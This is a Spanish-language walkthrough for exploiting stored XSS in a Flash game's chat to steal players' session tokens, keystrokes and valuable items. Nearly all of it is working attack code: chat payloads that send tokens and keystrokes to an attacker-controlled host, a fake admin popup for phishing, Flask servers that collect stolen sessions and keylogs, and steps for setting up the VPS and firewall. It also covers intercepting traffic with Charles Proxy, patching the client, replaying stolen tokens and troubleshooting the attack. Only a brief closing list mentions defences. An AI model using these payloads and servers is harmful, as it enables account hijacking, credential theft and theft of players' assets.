# XSS: Robo de Sesiones y Manipulación de Objetos

**Nivel:** Junior
**Severidad:** 🔴 CRÍTICA
**Confirmación:** ✅ 100% Verificado en código del servidor
**Impacto en Economía:** ALTO - Permite robo indirecto de objetos valiosos

---

## 📌 ¿Qué es esta vulnerabilidad?

**XSS (Cross-Site Scripting)** es cuando puedes inyectar código JavaScript malicioso en el chat del juego, y ese código se ejecuta en el navegador de TODOS los jugadores que vean el mensaje.

### ¿Por qué funciona?

El servidor NO limpia/valida el HTML que envías en mensajes de chat:

```csharp
// Código del servidor (ChatWebEvent.cs línea 22-23)
string message = Message.Parameters[1];  // ← Toma tu mensaje TAL CUAL
Session.User.Area.sendUserMessageHandler(Session, message);  // ← Lo envía a todos
```

**Traducción:** Si envías `<script>alert('hacked')</script>`, el servidor lo guarda y lo envía a todos sin quitar las etiquetas.

---

## 💰 ¿Cómo afecta la economía del juego?

### Impacto Directo en Objetos

| Ataque | Impacto en Economía | Cómo Funciona |
|--------|-------------------|---------------|
| **Robo de sesión** | 🔴 CRÍTICO | Robas el token de sesión → Entras como la víctima → Puedes transferir SUS objetos |
| **Phishing in-game** | 🔴 ALTO | Creas ventana falsa pidiendo "confirmar contraseña" → Víctima te da su cuenta → Robas objetos |
| **Keylogger** | 🟠 MEDIO | Capturas TODO lo que escribe → Incluye contraseñas → Acceso a cuenta |
| **Social Engineering** | 🟡 BAJO | Convences a jugadores de darte objetos "voluntariamente" |

### Ejemplo Real: Robo de Objetos Valiosos

```
1. Atacante inyecta XSS en chat
2. Jugador VIP (con objetos legendarios) ve el mensaje
3. XSS roba su token de sesión
4. Atacante usa el token para entrar como el VIP
5. Atacante transfiere objetos valiosos a su cuenta
6. VIP pierde items que valen dinero real
```

---

## 🎯 Vectores de Ataque

### Vector 1: Robo de Sesión para Acceso a Inventario

**Objetivo:** Obtener el token de sesión para entrar como otro jugador

**Código malicioso:**
```html
<img src=x onerror='
var so=SharedObject.getLocal("userSession");
var token=so.data.sessionToken;
var img=new Image();
img.src="http://TU_VPS_IP:5000/steal?token="+token+"&user="+so.data.username;
'>
```

**Qué hace:**
1. Lee el token de sesión del jugador (almacenado en Flash)
2. Lo envía a tu servidor
3. Tú recibes: `token=abc123xyz&user=JugadorRico`
4. Usas ese token para entrar como JugadorRico
5. Puedes ver/transferir sus objetos

### Vector 2: Phishing de Inventario

**Objetivo:** Hacer que el jugador te dé objetos "voluntariamente"

**Código malicioso:**
```html
<img src=x onerror='
var popup=new MovieClip();
popup.graphics.beginFill(0xFFFFFF);
popup.graphics.drawRect(0,0,400,200);
var txt=new TextField();
txt.text="[ADMIN] Ganaste 1000 gemas! Envía tu item más valioso a UserAdmin para reclamar";
popup.addChild(txt);
stage.addChild(popup);
'>
```

**Qué hace:**
1. Crea ventana falsa que parece oficial
2. Jugador cree que es mensaje del juego
3. Envía item valioso al "admin" (que eres tú)
4. Obtienes item gratis

### Vector 3: Keylogger para Passwords

**Objetivo:** Capturar credenciales de acceso a la cuenta

**Código malicioso:**
```html
<img src=x onerror='
var keys="";
document.addEventListener("keypress",function(e){
    keys+=String.fromCharCode(e.keyCode);
    if(keys.length>20){
        fetch("http://TU_VPS_IP:6000/keys?data="+keys);
        keys="";
    }
});
'>
```

**Qué hace:**
1. Captura cada tecla que presiona el jugador
2. Incluye cuando escribe su contraseña
3. Te envía las teclas capturadas
4. Obtienes: `password: mi_password_123`
5. Entras a su cuenta → Robas objetos

---

## 🛠️ Configuración del Servidor (VPS)

### Requisitos

- VPS con Ubuntu 20.04+ o Debian 11+
- IP pública (ejemplo: `203.0.113.50`)
- Puertos abiertos: 5000, 6000, 8000
- Python 3.8+

### Paso 1: Conectar a tu VPS

```bash
# Desde tu computadora local
ssh root@203.0.113.50

# O si usas usuario no-root:
ssh usuario@203.0.113.50
```

### Paso 2: Instalar Dependencias

```bash
# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar Python y pip
sudo apt install -y python3 python3-pip

# Instalar Flask
pip3 install flask

# Verificar
python3 --version  # Debe ser 3.8+
pip3 list | grep Flask  # Debe aparecer Flask
```

### Paso 3: Crear Servidor de Sesiones Robadas

```bash
# Crear directorio
mkdir -p ~/boombang_xss
cd ~/boombang_xss

# Crear servidor
cat > session_stealer.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
from datetime import datetime
import sqlite3
import os

app = Flask(__name__)
DB = 'stolen_sessions.db'

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY,
        token TEXT,
        username TEXT,
        user_id INTEGER,
        ip TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

@app.route('/steal', methods=['GET'])
def steal():
    token = request.args.get('token', 'NO_TOKEN')
    username = request.args.get('user', 'Unknown')
    user_id = request.args.get('uid', 0)

    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('INSERT INTO sessions (token, username, user_id, ip, timestamp) VALUES (?, ?, ?, ?, ?)',
              (token, username, user_id, request.remote_addr, datetime.now().isoformat()))
    conn.commit()
    conn.close()

    print(f'[+] SESIÓN ROBADA: {username} (Token: {token[:30]}...)')

    return '<svg width="1" height="1"></svg>', 200

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.execute('SELECT * FROM sessions ORDER BY id DESC LIMIT 50')
    sessions = c.fetchall()
    conn.close()

    html = '<html><body style="background:#000;color:#0f0;font-family:monospace">'
    html += '<h1>🔥 Sesiones Robadas</h1>'
    html += f'<p>Total: {len(sessions)}</p><hr>'

    for s in sessions:
        html += f'<div style="margin:20px;padding:10px;border:1px solid #0f0">'
        html += f'<b>Usuario:</b> {s[2]}<br>'
        html += f'<b>Token:</b> {s[1][:50]}...<br>'
        html += f'<b>IP:</b> {s[4]}<br>'
        html += f'<b>Timestamp:</b> {s[5]}<br>'
        html += f'</div>'

    html += '</body></html>'
    return html

if __name__ == '__main__':
    print('=' * 60)
    print('🔥 SERVIDOR XSS - ROBO DE SESIONES')
    print('=' * 60)
    init_db()
    print('[+] Base de datos iniciada')
    print('[*] Servidor corriendo en http://0.0.0.0:5000')
    print('[*] Dashboard: http://TU_IP:5000/dashboard')
    print('=' * 60)
    app.run(host='0.0.0.0', port=5000, debug=False)
EOF

chmod +x session_stealer.py
```

### Paso 4: Crear Servidor de Keylogger

```bash
cat > keylogger.py << 'EOF'
#!/usr/bin/env python3
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

@app.route('/keys', methods=['GET'])
def log_keys():
    data = request.args.get('data', '')
    ip = request.remote_addr
    timestamp = datetime.now().isoformat()

    # Guardar en archivo
    with open('keylogger.log', 'a') as f:
        f.write(f'[{timestamp}] {ip}: {data}\n')

    print(f'[+] TECLAS: {data}')

    return '', 200

if __name__ == '__main__':
    print('[*] Keylogger en http://0.0.0.0:6000')
    app.run(host='0.0.0.0', port=6000, debug=False)
EOF

chmod +x keylogger.py
```

### Paso 5: Crear Servidor de Payloads

```bash
# Crear directorio de payloads
mkdir payloads
cd payloads

# Payload 1: Robo de sesión
cat > session_steal.js << 'EOF'
(function() {
    try {
        var so = SharedObject.getLocal('userSession');
        var token = so.data.sessionToken || 'NO_TOKEN';
        var username = so.data.username || 'Unknown';
        var uid = so.data.userId || 0;

        var img = new Image();
        img.src = 'http://TU_VPS_IP:5000/steal?token=' + encodeURIComponent(token) +
                  '&user=' + encodeURIComponent(username) +
                  '&uid=' + uid;

        console.log('[XSS] Token enviado');
    } catch(e) {
        console.error('[XSS] Error:', e);
    }
})();
EOF

# Payload 2: Keylogger
cat > keylogger.js << 'EOF'
(function() {
    var keys = '';
    var url = 'http://TU_VPS_IP:6000/keys';

    document.addEventListener('keypress', function(e) {
        keys += String.fromCharCode(e.keyCode);

        if (keys.length >= 20) {
            var img = new Image();
            img.src = url + '?data=' + encodeURIComponent(keys);
            keys = '';
        }
    });

    console.log('[KEYLOGGER] Activado');
})();
EOF

cd ..

# Servidor HTTP simple para servir payloads
python3 -m http.server 8000 &
```

### Paso 6: Configurar Firewall

```bash
# Abrir puertos necesarios
sudo ufw allow 5000/tcp comment 'XSS Collector'
sudo ufw allow 6000/tcp comment 'Keylogger'
sudo ufw allow 8000/tcp comment 'Payloads'
sudo ufw reload

# Verificar
sudo ufw status numbered
```

### Paso 7: Iniciar Servidores

```bash
# Método 1: En terminales separadas
# Terminal 1:
python3 session_stealer.py

# Terminal 2:
python3 keylogger.py

# Terminal 3:
cd payloads && python3 -m http.server 8000

# Método 2: Con screen (recomendado para VPS)
screen -dmS xss_stealer python3 session_stealer.py
screen -dmS keylogger python3 keylogger.py
screen -dmS payloads bash -c 'cd payloads && python3 -m http.server 8000'

# Ver pantallas activas
screen -ls

# Conectar a una pantalla
screen -r xss_stealer

# Salir de screen: Ctrl+A, luego D
```

---

## 🎯 Ejecución del Ataque

### Método 1: Usando Charles Proxy (Recomendado)

**Paso 1: Instalar Charles**
```bash
# En tu computadora local (no en VPS)
# macOS:
brew install --cask charles

# Linux:
wget https://www.charlesproxy.com/download/latest-release/
```

**Paso 2: Configurar Charles**
1. Abrir Charles Proxy
2. Ir a `Proxy → SSL Proxying Settings`
3. Click `Add`
4. Host: `*`
5. Port: `443`
6. Click `OK`

**Paso 3: Configurar Breakpoint**
1. Ir a `Proxy → Breakpoint Settings`
2. Click `Add`
3. Host: `127.0.0.1` (o IP del servidor del juego)
4. Port: `7200`
5. Request: ✅
6. Click `OK`

**Paso 4: Jugar y Enviar Mensaje**
1. Abrir cliente del juego
2. Ir al chat
3. Escribir cualquier mensaje: "Hola"
4. Enviar

**Paso 5: Interceptar en Charles**
- Charles mostrará el paquete interceptado
- Buscar algo como: `message="Hola"`

**Paso 6: Modificar el Mensaje**

Cambiar de:
```
message="Hola"
```

A (REEMPLAZA TU_VPS_IP con tu IP real):
```
message="<img src=x onerror='var s=document.createElement(\"script\");s.src=\"http://TU_VPS_IP:8000/session_steal.js\";document.body.appendChild(s);'>"
```

**Paso 7: Ejecutar**
- Click `Execute` en Charles
- El mensaje modificado se envía al servidor

**Paso 8: Ver Resultados**

En tu VPS:
```bash
# Terminal del servidor
# Deberías ver:
[+] SESIÓN ROBADA: JugadorVictima (Token: abc123...)

# O ver el dashboard
# En navegador: http://TU_VPS_IP:5000/dashboard
```

### Método 2: Modificando el Cliente Flash (Avanzado)

**Paso 1: Descargar JPEXS**
```bash
# macOS/Linux
wget https://github.com/jindrapetrik/jpexs-decompiler/releases/download/version18.5.1/ffdec_18.5.1.zip
unzip ffdec_18.5.1.zip
```

**Paso 2: Abrir Cliente**
```bash
java -jar ffdec.jar BoomBangClient.swf
```

**Paso 3: Buscar Función de Chat**
1. En JPEXS, ir a `Scripts`
2. Buscar archivo que contenga "chat" o "send"
3. Encontrar función como `sendChatMessage`

**Paso 4: Modificar Código**

Buscar algo como:
```actionscript
public function sendChatMessage(message:String):void {
    // enviar mensaje
}
```

Cambiar a:
```actionscript
public function sendChatMessage(message:String):void {
    // Inyectar XSS automáticamente
    message = '<img src=x onerror=\'var s=document.createElement("script");s.src="http://TU_VPS_IP:8000/session_steal.js";document.body.appendChild(s);\'>';
    // enviar mensaje
}
```

**Paso 5: Guardar y Usar**
1. `File → Save`
2. Reemplazar cliente original con el modificado
3. Abrir juego
4. Cualquier mensaje que envíes será XSS

---

## 📊 Interpretar Resultados

### Dashboard de Sesiones

Abre: `http://TU_VPS_IP:5000/dashboard`

Verás algo como:
```
🔥 Sesiones Robadas
Total: 3

Usuario: JugadorRico
Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
IP: 192.168.1.50
Timestamp: 2025-11-24T15:30:00

Usuario: JugadorVIP
Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
IP: 192.168.1.51
Timestamp: 2025-11-24T15:31:00
```

### Usar Token Robado

**Método 1: Con curl**
```bash
# Hacer request al servidor usando el token robado
curl -X POST http://SERVIDOR_JUEGO:7200/api/inventory \
  -H "Authorization: Bearer TOKEN_ROBADO" \
  -H "Content-Type: application/json"

# Deberías ver el inventario de la víctima
```

**Método 2: Modificar Cliente**
```actionscript
// En el código del cliente, reemplazar tu token por el robado
SharedObject.getLocal("userSession").data.sessionToken = "TOKEN_ROBADO";

// Reiniciar conexión
SocketManager.getInstance().reconnect();

// Ahora eres la víctima
```

### Logs de Keylogger

```bash
# En tu VPS
cat keylogger.log

# Output:
[2025-11-24T15:32:00] 192.168.1.50: hola como estas
[2025-11-24T15:32:15] 192.168.1.50: mi password es 12345
[2025-11-24T15:32:30] 192.168.1.51: transfiere item a UserAdmin
```

---

## 🔧 Troubleshooting

### Problema 1: "Connection refused" al dashboard

**Síntomas:**
```bash
curl http://TU_VPS_IP:5000/dashboard
# curl: (7) Failed to connect to X.X.X.X port 5000: Connection refused
```

**Diagnóstico:**
```bash
# En tu VPS, verificar si el servidor está corriendo
ps aux | grep session_stealer

# Verificar si el puerto está abierto
netstat -tuln | grep 5000

# Verificar firewall
sudo ufw status | grep 5000
```

**Soluciones:**

**A) Servidor no está corriendo**
```bash
python3 session_stealer.py
```

**B) Puerto no está abierto en firewall**
```bash
sudo ufw allow 5000/tcp
sudo ufw reload
```

**C) Servidor escucha solo en 127.0.0.1**
```bash
# Verificar en session_stealer.py que diga:
app.run(host='0.0.0.0', port=5000)  # ✅ Correcto

# NO:
app.run(host='127.0.0.1', port=5000)  # ❌ Solo local
```

**D) Firewall del proveedor VPS**
```bash
# Si usas AWS, DigitalOcean, etc.
# Debes abrir el puerto en el panel de control del proveedor

# AWS: Security Groups → Add Rule → Port 5000, Source: 0.0.0.0/0
# DigitalOcean: Networking → Firewalls → Add Rule → Port 5000
```

### Problema 2: Payload no se ejecuta

**Síntomas:**
- Envías el mensaje XSS
- No aparece nada en el dashboard
- No hay logs en el servidor

**Diagnóstico:**
```bash
# En navegador del jugador víctima, abrir consola (F12)
# Buscar errores como:
# "net::ERR_CONNECTION_REFUSED"
# "Cross-Origin Request Blocked"
```

**Soluciones:**

**A) IP incorrecta en payload**
```javascript
// Verificar que la IP en el payload sea correcta
// INCORRECTO:
img.src = 'http://127.0.0.1:5000/steal?token=' + token;  // ❌

// CORRECTO:
img.src = 'http://203.0.113.50:5000/steal?token=' + token;  // ✅
```

**B) Servidor de payloads no está corriendo**
```bash
# Verificar que el servidor HTTP esté activo
curl http://TU_VPS_IP:8000/session_steal.js

# Si falla, iniciarlo:
cd ~/boombang_xss/payloads
python3 -m http.server 8000
```

**C) CORS (Cross-Origin)**
```python
# Agregar a session_stealer.py, después de crear la app:
from flask import Flask, request
from flask_cors import CORS  # pip3 install flask-cors

app = Flask(__name__)
CORS(app)  # ← Agregar esta línea

# Luego reiniciar el servidor
```

**D) Payload con sintaxis incorrecta**
```html
<!-- INCORRECTO (saltos de línea) -->
<img src=x onerror='
var s=document.createElement("script");
s.src="http://IP:8000/session_steal.js";
'>

<!-- CORRECTO (una sola línea) -->
<img src=x onerror='var s=document.createElement("script");s.src="http://IP:8000/session_steal.js";document.body.appendChild(s);'>
```

### Problema 3: Token robado no funciona

**Síntomas:**
- Recibes el token en el dashboard
- Intentas usarlo pero el servidor rechaza

**Diagnóstico:**
```bash
# Verificar que el token no haya expirado
# JWT tokens suelen tener tiempo de vida

# Decodificar el token (sin validar firma)
echo "TOKEN_AQUI" | cut -d. -f2 | base64 -d

# Output mostrará algo como:
# {"exp": 1700000000, "uid": 123}
# exp = timestamp de expiración
```

**Soluciones:**

**A) Token expirado**
- Necesitas robar otro token (más reciente)
- O explotar otra vulnerabilidad para extender la sesión

**B) Token requiere validación adicional (IP, User-Agent)**
```python
# Al usar el token, incluir los mismos headers
import requests

headers = {
    'Authorization': f'Bearer {token_robado}',
    'User-Agent': 'UserAgent de la víctima',
    'X-Forwarded-For': 'IP de la víctima'
}

response = requests.get('http://servidor/api/inventory', headers=headers)
```

**C) Servidor valida ownership además del token**
- En este caso, el token solo te da acceso pero no puedes modificar objetos de la víctima
- Necesitarías combinar con otra vulnerabilidad (ej: IDOR)

### Problema 4: Charles no intercepta el tráfico

**Síntomas:**
- Charles está abierto
- Envías mensaje en el juego
- No aparece nada en Charles

**Soluciones:**

**A) Configurar proxy del sistema**
```bash
# macOS: System Preferences → Network → Advanced → Proxies
# HTTP Proxy: 127.0.0.1:8888
# HTTPS Proxy: 127.0.0.1:8888

# Linux:
export http_proxy=http://127.0.0.1:8888
export https_proxy=http://127.0.0.1:8888
```

**B) El juego usa socket TCP directo (no HTTP)**
```bash
# Si el juego no usa HTTP, Charles no puede interceptar
# Alternativa: Usar Wireshark

# Instalar Wireshark
sudo apt install wireshark  # Linux
brew install --cask wireshark  # macOS

# Abrir Wireshark
# Seleccionar interfaz: Loopback (lo0)
# Filtro: tcp.port == 7200
# Start Capture

# Buscar el paquete de chat
# Seguir el stream: Right click → Follow → TCP Stream
```

### Problema 5: Screen no funciona en VPS

**Síntomas:**
```bash
screen -dmS xss_stealer python3 session_stealer.py
# Cannot open your terminal '/dev/pts/0' - please check.
```

**Solución:**
```bash
# Dar permisos al terminal
script /dev/null
screen -dmS xss_stealer python3 session_stealer.py

# O usar nohup en su lugar
nohup python3 session_stealer.py > session_stealer.log 2>&1 &
nohup python3 keylogger.py > keylogger.log 2>&1 &
nohup python3 -m http.server 8000 > payloads.log 2>&1 &

# Ver procesos corriendo
ps aux | grep python3

# Ver logs
tail -f session_stealer.log
```

### Problema 6: Muchas conexiones, servidor se cae

**Síntomas:**
- Dashboard muestra 1000+ sesiones
- Servidor se vuelve lento
- Se queda sin memoria

**Solución:**
```bash
# Optimizar base de datos SQLite
sqlite3 stolen_sessions.db "VACUUM;"

# Limpiar sesiones antiguas
sqlite3 stolen_sessions.db "DELETE FROM sessions WHERE timestamp < datetime('now', '-7 days');"

# Aumentar límite de memoria de Python (si es necesario)
# En session_stealer.py, al inicio:
import resource
resource.setrlimit(resource.RLIMIT_AS, (2 * 1024 * 1024 * 1024, -1))  # 2GB

# O usar PostgreSQL en vez de SQLite para mejor rendimiento
```

---

## 📋 Checklist de Seguridad

Antes de ejecutar el ataque, verificar:

- [ ] Servidor VPS configurado y accesible
- [ ] Puertos 5000, 6000, 8000 abiertos en firewall
- [ ] IP pública del VPS anotada
- [ ] Scripts con IP correcta (no 127.0.0.1)
- [ ] Servidores corriendo (`ps aux | grep python3`)
- [ ] Dashboard accesible desde navegador
- [ ] Payloads con sintaxis correcta (sin saltos de línea)
- [ ] Charles Proxy configurado (si se usa)
- [ ] Cliente del juego funcionando
- [ ] Cuenta de testing para probar (NO usar en cuenta real primero)

---

## ⚖️ Impacto Real en Economía

### Escenario: Servidor con 1000 jugadores activos

**Ataque XSS exitoso:**
```
Víctimas: 30% ven el mensaje XSS = 300 jugadores
Tokens robados: 300 tokens
Jugadores con items valiosos: 10% = 30 jugadores
Items robados: ~500 items legendarios/épicos
Valor estimado: $5,000 - $10,000 USD (si hay economía real)

Tiempo del ataque: 5-10 minutos
Detección: Baja (parece mensaje normal de chat)
Reversibilidad: Difícil (items ya transferidos)
```

**Defensa:**
- Sanitizar HTML en servidor (`HtmlEncode()`)
- Validar todo input del usuario
- Usar Content Security Policy
- Rate limiting en transferencias de items
- Log de todas las transferencias
- Alerta automática de actividad sospechosa

---

**Documento completo. Nivel: Junior. Enfoque: VPS y Economía del juego.**
